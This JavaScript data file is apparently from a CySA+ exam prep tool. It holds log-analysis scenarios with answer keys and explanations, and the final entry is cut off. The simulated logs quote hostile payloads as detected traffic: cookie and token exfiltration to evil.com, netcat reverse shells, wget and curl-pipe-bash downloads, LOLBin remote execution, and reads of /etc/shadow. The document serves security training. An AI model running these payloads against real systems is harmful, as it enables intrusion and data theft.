// CySA+ Exam Prep Tool - Data File

// Log Analysis Scenarios (20+ scenarios)
const logScenarios = [
    {
        id: 1,
        difficulty: "beginner",
        type: "auth",
        title: "SSH Brute Force Attack",
        log: `Mar 15 10:23:45 server sshd[12345]: Failed password for admin from 192.168.1.100 port 52341 ssh2
Mar 15 10:23:46 server sshd[12346]: Failed password for admin from 192.168.1.100 port 52342 ssh2
Mar 15 10:23:47 server sshd[12347]: Failed password for admin from 192.168.1.100 port 52343 ssh2
Mar 15 10:23:48 server sshd[12348]: Failed password for admin from 192.168.1.100 port 52344 ssh2
Mar 15 10:23:49 server sshd[12349]: Failed password for admin from 192.168.1.100 port 52345 ssh2
Mar 15 10:23:50 server sshd[12350]: Failed password for admin from 192.168.1.100 port 52346 ssh2
Mar 15 10:23:51 server sshd[12351]: Failed password for root from 192.168.1.100 port 52347 ssh2
Mar 15 10:23:52 server sshd[12352]: Failed password for root from 192.168.1.100 port 52348 ssh2`,
        correctAnswer: "brute_force",
        explanation: "This log shows a classic brute force attack pattern. Key indicators include: (1) Multiple failed password attempts in rapid succession (one per second), (2) Same source IP address (192.168.1.100), (3) Targeting common usernames like 'admin' and 'root', (4) Sequential port numbers indicating automated tool usage. This pattern is characteristic of tools like Hydra or Medusa attempting to guess credentials.",
        indicators: ["Rapid successive failures", "Same source IP", "Common usernames targeted", "Sequential ports"]
    },
    {
        id: 2,
        difficulty: "beginner",
        type: "webserver",
        title: "SQL Injection Attack",
        log: `192.168.1.50 - - [15/Mar/2024:14:23:11 +0000] "GET /products.php?id=1' HTTP/1.1" 500 1234
192.168.1.50 - - [15/Mar/2024:14:23:15 +0000] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 200 5678
192.168.1.50 - - [15/Mar/2024:14:23:18 +0000] "GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 9012
192.168.1.50 - - [15/Mar/2024:14:23:22 +0000] "GET /products.php?id=1'; DROP TABLE users;-- HTTP/1.1" 200 345`,
        correctAnswer: "sql_injection",
        explanation: "This log clearly shows SQL injection attempts. Key indicators: (1) Single quotes being injected to break SQL syntax, (2) Classic 'OR 1=1' bypass attempt, (3) UNION SELECT statement to extract data from other tables, (4) Attempted DROP TABLE command. The initial 500 error suggests the attacker was probing for vulnerabilities, followed by successful 200 responses indicating the injection worked.",
        indicators: ["SQL keywords (UNION, SELECT, DROP)", "Single quote injection", "Boolean logic (OR '1'='1')", "Comment sequences (--)"]
    },
    {
        id: 3,
        difficulty: "beginner",
        type: "firewall",
        title: "Port Scanning Activity",
        log: `Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45123 -> 192.168.1.10:21 (FTP)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45124 -> 192.168.1.10:22 (SSH)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45125 -> 192.168.1.10:23 (Telnet)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45126 -> 192.168.1.10:25 (SMTP)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45127 -> 192.168.1.10:80 (HTTP)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45128 -> 192.168.1.10:443 (HTTPS)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45129 -> 192.168.1.10:3306 (MySQL)
Mar 15 11:00:01 fw01 kernel: DENY TCP 10.0.0.50:45130 -> 192.168.1.10:3389 (RDP)`,
        correctAnswer: "port_scanning",
        explanation: "This is a clear port scan, likely using a tool like Nmap. Key indicators: (1) Same source IP scanning multiple ports, (2) Common service ports being probed (21, 22, 23, 25, 80, 443, 3306, 3389), (3) All connections denied by firewall, (4) Rapid timing (all within same second), (5) Sequential source ports indicating automated scanning. This appears to be reconnaissance activity mapping available services.",
        indicators: ["Multiple port targets", "Same timestamp", "Sequential source ports", "Common service ports"]
    },
    {
        id: 4,
        difficulty: "intermediate",
        type: "system",
        title: "Privilege Escalation Attempt",
        log: `Mar 15 15:30:22 server sudo: user1 : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
Mar 15 15:30:45 server sudo: user1 : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/usr/bin/passwd root
Mar 15 15:31:02 server su[54321]: FAILED su for root by user1
Mar 15 15:31:15 server kernel: user1[54322] trap int3 ip:7f4a3b2c1d00 sp:7fff12345678 error:0 in bash
Mar 15 15:31:30 server sudo: user1 : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/exploit.sh`,
        correctAnswer: "privilege_escalation",
        explanation: "This log shows a user attempting to escalate privileges. Key indicators: (1) Multiple 'NOT in sudoers' messages - user trying sudo without permission, (2) Attempts to run /bin/bash and change root password, (3) Failed su command to become root, (4) Suspicious trap/int3 kernel message possibly indicating exploit attempt, (5) Attempt to execute script from /tmp directory (common for exploits). This user is actively trying to gain root access.",
        indicators: ["Sudoers violations", "Password change attempts", "Failed su commands", "Suspicious /tmp execution"]
    },
    {
        id: 5,
        difficulty: "intermediate",
        type: "firewall",
        title: "Data Exfiltration",
        log: `Mar 15 03:00:00 fw01 ALLOW TCP 192.168.1.50:55123 -> 185.123.45.67:443 bytes_sent=15728640
Mar 15 03:05:00 fw01 ALLOW TCP 192.168.1.50:55124 -> 185.123.45.67:443 bytes_sent=15728640
Mar 15 03:10:00 fw01 ALLOW TCP 192.168.1.50:55125 -> 185.123.45.67:443 bytes_sent=15728640
Mar 15 03:15:00 fw01 ALLOW TCP 192.168.1.50:55126 -> 185.123.45.67:443 bytes_sent=15728640
Mar 15 03:20:00 fw01 ALLOW TCP 192.168.1.50:55127 -> 185.123.45.67:443 bytes_sent=15728640
Mar 15 03:25:00 fw01 ALLOW TCP 192.168.1.50:55128 -> 185.123.45.67:443 bytes_sent=15728640`,
        correctAnswer: "data_exfiltration",
        explanation: "This log indicates potential data exfiltration. Key indicators: (1) Large data transfers (~15MB each) at unusual hours (3 AM), (2) Regular intervals (every 5 minutes) suggesting automated transfer, (3) Same destination IP for all transfers, (4) Using port 443 (HTTPS) to blend with normal traffic, (5) Consistent data size suggesting systematic file transfer. Total of 90MB+ transferred to an external IP during off-hours.",
        indicators: ["Large outbound transfers", "Off-hours activity (3 AM)", "Regular intervals", "Unknown external destination"]
    },
    {
        id: 6,
        difficulty: "beginner",
        type: "webserver",
        title: "Directory Traversal Attack",
        log: `192.168.1.75 - - [15/Mar/2024:09:15:22 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 200 1542
192.168.1.75 - - [15/Mar/2024:09:15:30 +0000] "GET /download.php?file=....//....//....//etc/shadow HTTP/1.1" 403 234
192.168.1.75 - - [15/Mar/2024:09:15:35 +0000] "GET /download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 200 1542
192.168.1.75 - - [15/Mar/2024:09:15:42 +0000] "GET /download.php?file=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1" 404 123`,
        correctAnswer: "path_traversal",
        explanation: "This shows path traversal (directory traversal) attacks. Key indicators: (1) Multiple '../' sequences to navigate up directories, (2) Targeting sensitive files (/etc/passwd, /etc/shadow, SAM), (3) Various encoding bypasses including URL encoding (%2e%2e%2f), (4) Double-dot variations (....//), (5) Both Unix and Windows path attempts. The 200 responses indicate successful file access.",
        indicators: ["../ sequences", "Sensitive file targets", "URL-encoded characters", "Mix of path separators"]
    },
    {
        id: 7,
        difficulty: "intermediate",
        type: "ids",
        title: "Cross-Site Scripting (XSS)",
        log: `[2024-03-15 10:30:15] [ALERT] XSS Attack Detected
Source: 192.168.1.80
Target: 192.168.1.5:80
Request: GET /search?q=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>
[2024-03-15 10:30:22] [ALERT] XSS Attack Detected
Source: 192.168.1.80
Target: 192.168.1.5:80
Request: GET /comment?text=<img src=x onerror=alert('XSS')>
[2024-03-15 10:30:30] [ALERT] XSS Attack Detected
Source: 192.168.1.80
Target: 192.168.1.5:80
Request: GET /profile?name=<svg onload=fetch('http://evil.com/log?data='+localStorage.getItem('token'))>`,
        correctAnswer: "xss",
        explanation: "These IDS alerts show XSS (Cross-Site Scripting) attack attempts. Key indicators: (1) Script tags attempting to execute JavaScript, (2) Cookie stealing attempt (document.cookie), (3) Event handler abuse (onerror, onload), (4) Various payload vectors (script, img, svg), (5) Attempts to exfiltrate data to external domain. These are trying to inject malicious scripts that would execute in other users' browsers.",
        indicators: ["<script> tags", "Event handlers (onerror, onload)", "Cookie/token access", "External domain references"]
    },
    {
        id: 8,
        difficulty: "advanced",
        type: "ids",
        title: "Command Injection Attack",
        log: `[2024-03-15 14:22:10] [CRITICAL] Command Injection Detected
Source: 10.0.0.100
Request: POST /api/ping HTTP/1.1
Body: host=192.168.1.1;cat /etc/passwd
[2024-03-15 14:22:15] [CRITICAL] Command Injection Detected
Source: 10.0.0.100
Request: POST /api/ping HTTP/1.1
Body: host=192.168.1.1|wget http://malware.com/shell.sh -O /tmp/shell.sh
[2024-03-15 14:22:20] [CRITICAL] Command Injection Detected
Source: 10.0.0.100
Request: POST /api/ping HTTP/1.1
Body: host=\`whoami\`
[2024-03-15 14:22:25] [CRITICAL] Command Injection Detected
Source: 10.0.0.100
Request: POST /api/ping HTTP/1.1
Body: host=$(nc -e /bin/bash 10.0.0.100 4444)`,
        correctAnswer: "command_injection",
        explanation: "This shows command injection attacks against a ping API. Key indicators: (1) Command separators (; | `) to chain commands, (2) System commands (cat, wget, whoami, nc), (3) Attempted reverse shell using netcat, (4) Downloading external scripts, (5) Targeting an API that likely executes system commands. The attacker is exploiting insufficient input validation in an API that runs ping commands.",
        indicators: ["Command separators (; | $())", "System command execution", "Reverse shell attempt", "Malware download attempt"]
    },
    {
        id: 9,
        difficulty: "advanced",
        type: "system",
        title: "Ransomware Activity",
        log: `Mar 15 02:15:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.168.1.100 DST=192.168.1.50 PROTO=TCP DPT=445
Mar 15 02:15:05 server smbd[9876]: Connection from 192.168.1.100
Mar 15 02:15:10 server kernel: audit: file="/home/user/Documents/report.docx" renamed to "/home/user/Documents/report.docx.encrypted"
Mar 15 02:15:11 server kernel: audit: file="/home/user/Documents/budget.xlsx" renamed to "/home/user/Documents/budget.xlsx.encrypted"
Mar 15 02:15:12 server kernel: audit: file="/home/user/Documents/photo.jpg" renamed to "/home/user/Documents/photo.jpg.encrypted"
Mar 15 02:15:15 server kernel: audit: file="/home/user/Documents/README_DECRYPT.txt" created
Mar 15 02:15:20 server kernel: High CPU usage detected: 98% by process "crypt.exe"`,
        correctAnswer: "ransomware",
        explanation: "This log shows ransomware activity. Key indicators: (1) SMB connection on port 445 (common ransomware vector), (2) Mass file renaming with '.encrypted' extension, (3) Creation of ransom note file (README_DECRYPT.txt), (4) High CPU usage from suspicious process (crypt.exe), (5) Rapid sequential file modifications. This is characteristic of ransomware encrypting files and leaving ransom instructions.",
        indicators: ["File encryption/renaming", "Ransom note creation", "High CPU from unknown process", "SMB lateral movement"]
    },
    {
        id: 10,
        difficulty: "intermediate",
        type: "webserver",
        title: "Web Shell Upload",
        log: `192.168.1.90 - - [15/Mar/2024:11:45:00 +0000] "POST /upload.php HTTP/1.1" 200 45 "-" "Mozilla/5.0"
192.168.1.90 - - [15/Mar/2024:11:45:05 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 32 "-" "Mozilla/5.0"
192.168.1.90 - - [15/Mar/2024:11:45:10 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1842 "-" "Mozilla/5.0"
192.168.1.90 - - [15/Mar/2024:11:45:15 +0000] "GET /uploads/shell.php?cmd=wget%20http://malware.com/backdoor%20-O%20/tmp/bd HTTP/1.1" 200 0 "-" "Mozilla/5.0"
192.168.1.90 - - [15/Mar/2024:11:45:20 +0000] "GET /uploads/shell.php?cmd=chmod%20%2bx%20/tmp/bd HTTP/1.1" 200 0 "-" "Mozilla/5.0"`,
        correctAnswer: "webshell",
        explanation: "This shows a web shell attack. Key indicators: (1) File upload followed by accessing uploaded .php file, (2) 'cmd' parameter executing system commands, (3) Information gathering (id, /etc/passwd), (4) Downloading additional malware, (5) Setting executable permissions. The attacker uploaded a PHP shell and is now executing commands on the server, establishing persistence with additional backdoor.",
        indicators: ["PHP file with cmd parameter", "System command execution", "Post-upload access", "Malware download via shell"]
    },
    {
        id: 11,
        difficulty: "beginner",
        type: "auth",
        title: "Credential Stuffing Attack",
        log: `Mar 15 08:00:01 auth sshd[1001]: Failed password for user_john from 203.0.113.50 port 55001
Mar 15 08:00:02 auth sshd[1002]: Failed password for user_sarah from 203.0.113.50 port 55002
Mar 15 08:00:03 auth sshd[1003]: Failed password for user_mike from 203.0.113.50 port 55003
Mar 15 08:00:04 auth sshd[1004]: Failed password for user_lisa from 203.0.113.50 port 55004
Mar 15 08:00:05 auth sshd[1005]: Accepted password for user_tom from 203.0.113.50 port 55005
Mar 15 08:00:06 auth sshd[1006]: Failed password for user_anna from 203.0.113.50 port 55006
Mar 15 08:00:07 auth sshd[1007]: Failed password for user_dave from 203.0.113.50 port 55007`,
        correctAnswer: "credential_stuffing",
        explanation: "This is a credential stuffing attack (different from brute force). Key indicators: (1) Different usernames being tried (not same user repeatedly), (2) One attempt per username (using known password from breach), (3) Same source IP and rapid timing, (4) One successful login among failures (user_tom - compromised credentials). Attackers use breached username/password lists from other sites to find password reuse.",
        indicators: ["Multiple unique usernames", "Single attempt per user", "Occasional success among failures", "Rapid automated timing"]
    },
    {
        id: 12,
        difficulty: "advanced",
        type: "ids",
        title: "DNS Tunneling",
        log: `[2024-03-15 16:00:00] DNS Query: aGVsbG8gd29ybGQ.data.evil-domain.com from 192.168.1.100
[2024-03-15 16:00:01] DNS Query: dGhpcyBpcyBzZWNyZXQ.data.evil-domain.com from 192.168.1.100
[2024-03-15 16:00:02] DNS Query: ZGF0YSBleGZpbHRyYXRpb24.data.evil-domain.com from 192.168.1.100
[2024-03-15 16:00:03] DNS Query: Y29uZmlkZW50aWFsIGZpbGU.data.evil-domain.com from 192.168.1.100
[2024-03-15 16:00:04] DNS Query: c2VuZGluZyBtb3JlIGRhdGE.data.evil-domain.com from 192.168.1.100
[2024-03-15 16:00:05] DNS Query: ZW5jb2RlZCBwYXlsb2Fk.data.evil-domain.com from 192.168.1.100
[ALERT] Anomaly: 500+ DNS queries to single domain in 60 seconds`,
        correctAnswer: "dns_tunneling",
        explanation: "This shows DNS tunneling for data exfiltration. Key indicators: (1) Base64-encoded data in DNS subdomain queries, (2) Single domain receiving all queries (evil-domain.com), (3) High volume of DNS requests in short time, (4) Unusual subdomain patterns (random-looking strings), (5) Consistent pattern suggesting automated tool. DNS tunneling abuses DNS protocol to bypass firewalls and exfiltrate data.",
        indicators: ["Base64 in subdomains", "High query volume to single domain", "Random-looking subdomain names", "Regular timing pattern"]
    },
    {
        id: 13,
        difficulty: "intermediate",
        type: "firewall",
        title: "DDoS Attack",
        log: `Mar 15 12:00:00 fw01 DENY TCP 45.33.32.1:12345 -> 192.168.1.5:80 SYN
Mar 15 12:00:00 fw01 DENY TCP 45.33.32.2:12346 -> 192.168.1.5:80 SYN
Mar 15 12:00:00 fw01 DENY TCP 45.33.32.3:12347 -> 192.168.1.5:80 SYN
Mar 15 12:00:00 fw01 DENY TCP 45.33.32.4:12348 -> 192.168.1.5:80 SYN
Mar 15 12:00:00 fw01 DENY TCP 45.33.32.5:12349 -> 192.168.1.5:80 SYN
... [10000+ similar entries]
Mar 15 12:00:00 fw01 [ALERT] SYN flood detected - 15000 SYN packets/second to 192.168.1.5:80
Mar 15 12:00:01 fw01 [ALERT] Connection table 98% full
Mar 15 12:00:02 webserver [error] Server reached maximum connections - service degraded`,
        correctAnswer: "ddos",
        explanation: "This is a Distributed Denial of Service (DDoS) attack, specifically a SYN flood. Key indicators: (1) Massive number of connections from different source IPs (distributed), (2) All SYN packets (TCP handshake initiation), (3) Same target (192.168.1.5:80), (4) Connection table exhaustion, (5) Service degradation. SYN floods exhaust server resources by initiating but never completing TCP handshakes.",
        indicators: ["Multiple source IPs", "SYN-only packets", "High packet rate", "Connection exhaustion", "Service impact"]
    },
    {
        id: 14,
        difficulty: "advanced",
        type: "system",
        title: "Lateral Movement via Pass-the-Hash",
        log: `Mar 15 14:30:00 dc01 Security[4624]: Logon Type 3 - User: admin - Workstation: WS001 - IP: 192.168.1.50
Mar 15 14:30:05 dc01 Security[4624]: Logon Type 3 - User: admin - Workstation: WS002 - IP: 192.168.1.50
Mar 15 14:30:10 dc01 Security[4624]: Logon Type 3 - User: admin - Workstation: WS003 - IP: 192.168.1.50
Mar 15 14:30:15 dc01 Security[4672]: Special Privileges Assigned - User: admin - Privileges: SeDebugPrivilege, SeTcbPrivilege
Mar 15 14:30:20 dc01 Security[4648]: Explicit Credentials Used - Subject: admin - Target: SYSTEM on DC01
Mar 15 14:30:25 dc01 Security[4688]: Process Created: mimikatz.exe - User: admin - CommandLine: mimikatz.exe "sekurlsa::logonpasswords"`,
        correctAnswer: "lateral_movement",
        explanation: "This shows lateral movement using pass-the-hash technique. Key indicators: (1) Type 3 logons (network) from same IP to multiple workstations, (2) Rapid succession suggests automated tool, (3) Special privileges assigned (SeDebugPrivilege - used for credential theft), (4) Explicit credential use (pass-the-hash), (5) Mimikatz execution for credential dumping. Attacker is moving through network using stolen NTLM hashes.",
        indicators: ["Type 3 network logons", "Multiple targets same source", "SeDebugPrivilege", "Mimikatz detection", "Explicit credential use"]
    },
    {
        id: 15,
        difficulty: "intermediate",
        type: "webserver",
        title: "XML External Entity (XXE) Attack",
        log: `192.168.1.95 - - [15/Mar/2024:13:00:00 +0000] "POST /api/parse-xml HTTP/1.1" 200 2456
Content-Type: application/xml
Body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>

192.168.1.95 - - [15/Mar/2024:13:00:10 +0000] "POST /api/parse-xml HTTP/1.1" 200 0
Body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.95:8080/collect">]><data>&xxe;</data>

192.168.1.95 - - [15/Mar/2024:13:00:20 +0000] "POST /api/parse-xml HTTP/1.1" 200 45678
Body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>`,
        correctAnswer: "xxe",
        explanation: "This shows XML External Entity (XXE) injection attacks. Key indicators: (1) DOCTYPE declarations with ENTITY definitions, (2) SYSTEM keyword referencing local files, (3) Targeting sensitive files (/etc/passwd, /etc/shadow), (4) External URL reference for data exfiltration, (5) Successful responses indicate vulnerability. XXE exploits XML parsers that process external entity references.",
        indicators: ["DOCTYPE with ENTITY", "SYSTEM file:// references", "External URL entities", "Sensitive file targets"]
    },
    {
        id: 16,
        difficulty: "beginner",
        type: "auth",
        title: "After-Hours Access Anomaly",
        log: `Mar 16 02:30:00 server sshd[5001]: Accepted publickey for sysadmin from 203.0.113.100 port 45678 ssh2
Mar 16 02:30:05 server sudo: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/bash
Mar 16 02:30:15 server audit: user=root cmd="tar -czf /tmp/backup.tar.gz /etc /var/www /home"
Mar 16 02:35:00 server audit: user=root cmd="scp /tmp/backup.tar.gz user@203.0.113.100:/data/"
Mar 16 02:35:30 server audit: user=root cmd="rm -rf /tmp/backup.tar.gz"
Mar 16 02:36:00 server sshd[5001]: Disconnected from 203.0.113.100 port 45678`,
        correctAnswer: "insider_threat",
        explanation: "This shows potential insider threat or compromised account activity. Key indicators: (1) Login at unusual hours (2:30 AM), (2) Immediate privilege escalation to root, (3) Creating archive of sensitive directories, (4) Exfiltrating data via SCP to external server, (5) Covering tracks by deleting evidence. Even though this is a legitimate user, the behavior pattern is suspicious.",
        indicators: ["Off-hours access", "Immediate root escalation", "Bulk data archiving", "External data transfer", "Evidence cleanup"]
    },
    {
        id: 17,
        difficulty: "advanced",
        type: "ids",
        title: "Server-Side Request Forgery (SSRF)",
        log: `[2024-03-15 15:00:00] [ALERT] SSRF Attempt Detected
Source: 192.168.1.85
Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

[2024-03-15 15:00:05] [ALERT] SSRF Attempt Detected
Source: 192.168.1.85
Request: GET /fetch?url=http://localhost:6379/CONFIG%20GET%20*

[2024-03-15 15:00:10] [ALERT] SSRF Attempt Detected
Source: 192.168.1.85
Request: GET /fetch?url=http://192.168.1.1:8080/admin

[2024-03-15 15:00:15] [ALERT] SSRF Attempt Detected
Source: 192.168.1.85
Request: GET /fetch?url=file:///etc/passwd`,
        correctAnswer: "ssrf",
        explanation: "This shows Server-Side Request Forgery (SSRF) attacks. Key indicators: (1) URL parameter pointing to internal resources, (2) AWS metadata endpoint access (169.254.169.254), (3) Localhost service probing (Redis on 6379), (4) Internal network scanning, (5) file:// protocol for local file access. SSRF tricks the server into making requests to unintended locations.",
        indicators: ["Internal IP targets", "Cloud metadata endpoints", "Localhost service access", "file:// protocol", "URL parameter manipulation"]
    },
    {
        id: 18,
        difficulty: "intermediate",
        type: "system",
        title: "Cryptominer Installation",
        log: `Mar 15 18:00:00 server audit: user=www-data cmd="curl -s http://pool.minexmr.com/setup.sh | bash"
Mar 15 18:00:05 server audit: user=www-data cmd="chmod +x /tmp/.hidden/xmrig"
Mar 15 18:00:10 server audit: user=www-data cmd="nohup /tmp/.hidden/xmrig -o pool.minexmr.com:443 -u WALLET_ADDR &"
Mar 15 18:00:15 server kernel: [ALERT] High CPU usage: 95% by process xmrig (PID: 12345)
Mar 15 18:01:00 server cron: (www-data) CMD (/tmp/.hidden/xmrig -o pool.minexmr.com:443)
Mar 15 18:05:00 server kernel: CPU temperature warning: 85°C`,
        correctAnswer: "cryptomining",
        explanation: "This shows unauthorized cryptominer installation. Key indicators: (1) Downloading and executing remote script, (2) XMRig (Monero miner) installation in hidden directory, (3) Connection to mining pool, (4) Extremely high CPU usage (95%), (5) Persistence via cron job, (6) Hardware stress (high temperature). The www-data user (web server) was likely compromised.",
        indicators: ["XMRig or mining software", "Hidden directory (/tmp/.hidden)", "Mining pool connections", "Extreme CPU usage", "Cron persistence"]
    },
    {
        id: 19,
        difficulty: "advanced",
        type: "auth",
        title: "Kerberoasting Attack",
        log: `Mar 15 20:00:00 dc01 Security[4769]: Kerberos Service Ticket Request - User: attacker - Service: MSSQLSvc/sql01.domain.com - Encryption: 0x17 (RC4)
Mar 15 20:00:01 dc01 Security[4769]: Kerberos Service Ticket Request - User: attacker - Service: HTTP/web01.domain.com - Encryption: 0x17 (RC4)
Mar 15 20:00:02 dc01 Security[4769]: Kerberos Service Ticket Request - User: attacker - Service: CIFS/file01.domain.com - Encryption: 0x17 (RC4)
Mar 15 20:00:03 dc01 Security[4769]: Kerberos Service Ticket Request - User: attacker - Service: MSSQLSvc/sql02.domain.com - Encryption: 0x17 (RC4)
[ALERT] Anomaly: User 'attacker' requested 50 service tickets in 60 seconds`,
        correctAnswer: "kerberoasting",
        explanation: "This shows a Kerberoasting attack. Key indicators: (1) Single user requesting many service tickets rapidly, (2) RC4 encryption (0x17) - weaker, crackable offline, (3) Targeting service accounts (MSSQLSvc, HTTP, CIFS), (4) Event ID 4769 for service ticket requests, (5) Abnormal volume in short time. Attackers request tickets to crack service account passwords offline.",
        indicators: ["Multiple TGS requests", "RC4 encryption type", "Service account targets", "Rapid succession", "Event 4769 volume"]
    },
    {
        id: 20,
        difficulty: "beginner",
        type: "webserver",
        title: "Automated Vulnerability Scanning",
        log: `192.168.1.200 - - [15/Mar/2024:22:00:00 +0000] "GET /robots.txt HTTP/1.1" 200 156 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:01 +0000] "GET /admin/ HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:02 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:03 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:04 +0000] "GET /backup.sql HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:05 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
192.168.1.200 - - [15/Mar/2024:22:00:06 +0000] "GET /server-status HTTP/1.1" 403 199 "-" "Nikto/2.1.6"`,
        correctAnswer: "vulnerability_scanning",
        explanation: "This shows automated vulnerability scanning, likely Nikto. Key indicators: (1) User-Agent explicitly identifies Nikto scanner, (2) Probing for common sensitive paths, (3) Looking for admin panels, exposed databases, git repos, (4) Rapid sequential requests, (5) Testing for common misconfigurations. This is reconnaissance to identify potential attack vectors.",
        indicators: ["Scanner user-agent", "Common path enumeration", "Rapid requests", "Mixed response codes", "Sensitive file probing"]
    },
    {
        id: 21,
        difficulty: "intermediate",
        type: "ids",
        title: "Buffer Overflow Attempt",
        log: `[2024-03-15 21:00:00] [CRITICAL] Buffer Overflow Detected
Source: 10.0.0.200
Target: 192.168.1.5:21 (FTP)
Payload Size: 4096 bytes
Pattern: 0x41414141 (AAAA) NOP sled detected

[2024-03-15 21:00:05] [CRITICAL] Shellcode Pattern Detected
Source: 10.0.0.200
Signature: Linux x86 reverse shell shellcode
Callback: 10.0.0.200:4444

[2024-03-15 21:00:06] [INFO] FTP Service crashed - PID 5678 terminated with SIGSEGV`,
        correctAnswer: "buffer_overflow",
        explanation: "This shows a buffer overflow exploit attempt. Key indicators: (1) Oversized payload (4096 bytes), (2) NOP sled pattern (0x41 = 'A'), (3) Shellcode signature detected, (4) Reverse shell callback address, (5) Service crash with SIGSEGV (segmentation fault). Attacker is exploiting FTP vulnerability to execute arbitrary code and establish remote access.",
        indicators: ["Large payload size", "NOP sled (0x41)", "Shellcode patterns", "Service crash/SIGSEGV", "Reverse shell setup"]
    },
    {
        id: 22,
        difficulty: "advanced",
        type: "system",
        title: "Living off the Land (LOLBins)",
        log: `Mar 15 23:00:00 workstation Security[4688]: Process: certutil.exe CommandLine: certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\update.exe
Mar 15 23:00:05 workstation Security[4688]: Process: mshta.exe CommandLine: mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(gc C:\\Temp\\script.ps1)"":close")
Mar 15 23:00:10 workstation Security[4688]: Process: regsvr32.exe CommandLine: regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
Mar 15 23:00:15 workstation Security[4688]: Process: rundll32.exe CommandLine: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://evil.com/s.sct")`,
        correctAnswer: "lolbin_abuse",
        explanation: "This shows Living off the Land Binary (LOLBin) abuse. Key indicators: (1) Certutil used for download (legitimate tool misused), (2) Mshta executing VBScript with PowerShell, (3) Regsvr32 loading remote script, (4) Rundll32 with JavaScript execution. Attackers use built-in Windows tools to evade detection since these binaries are trusted and signed by Microsoft.",
        indicators: ["Certutil downloads", "Mshta script execution", "Regsvr32 remote loading", "Rundll32 script abuse", "Built-in tool misuse"]
    },
    {
        id: 23,
        difficulty: "intermediate",
        type: "firewall",
        title: "C2 Beaconing",
        log: `Mar 15 00:00:00 fw01 ALLOW TCP 192.168.1.100:49152 -> 203.0.113.50:443 bytes=256
Mar 15 00:05:00 fw01 ALLOW TCP 192.168.1.100:49153 -> 203.0.113.50:443 bytes=256
Mar 15 00:10:00 fw01 ALLOW TCP 192.168.1.100:49154 -> 203.0.113.50:443 bytes=256
Mar 15 00:15:00 fw01 ALLOW TCP 192.168.1.100:49155 -> 203.0.113.50:443 bytes=256
Mar 15 00:20:00 fw01 ALLOW TCP 192.168.1.100:49156 -> 203.0.113.50:443 bytes=1024
Mar 15 00:25:00 fw01 ALLOW TCP 192.168.1.100:49157 -> 203.0.113.50:443 bytes=256
... [continues for 24 hours with 5-minute intervals]`,
        correctAnswer: "c2_beaconing",
        explanation: "This shows Command and Control (C2) beaconing behavior. Key indicators: (1) Regular interval connections (exactly 5 minutes), (2) Same destination IP/port, (3) Consistent small payload size (256 bytes), (4) Occasional larger response (1024 bytes - receiving commands), (5) 24/7 activity pattern. Malware checking in with C2 server for instructions.",
        indicators: ["Fixed interval timing", "Consistent payload size", "Single destination", "24/7 activity", "Occasional size variation"]
    },
    {
        id: 24,
        difficulty: "beginner",
        type: "auth",
        title: "Password Spraying",
        log: `Mar 15 09:00:00 dc01 Security[4625]: Logon Failure - User: jsmith - Reason: Bad Password - Source: 10.0.0.50
Mar 15 09:00:00 dc01 Security[4625]: Logon Failure - User: mjohnson - Reason: Bad Password - Source: 10.0.0.50
Mar 15 09:00:00 dc01 Security[4625]: Logon Failure - User: twilliams - Reason: Bad Password - Source: 10.0.0.50
Mar 15 09:00:00 dc01 Security[4625]: Logon Failure - User: kbrown - Reason: Bad Password - Source: 10.0.0.50
Mar 15 09:00:00 dc01 Security[4625]: Logon Failure - User: ldavis - Reason: Bad Password - Source: 10.0.0.50
Mar 15 09:30:00 dc01 Security[4625]: Logon Failure - User: jsmith - Reason: Bad Password - Source: 10.0.0.50`,
        correctAnswer: "password_spraying",
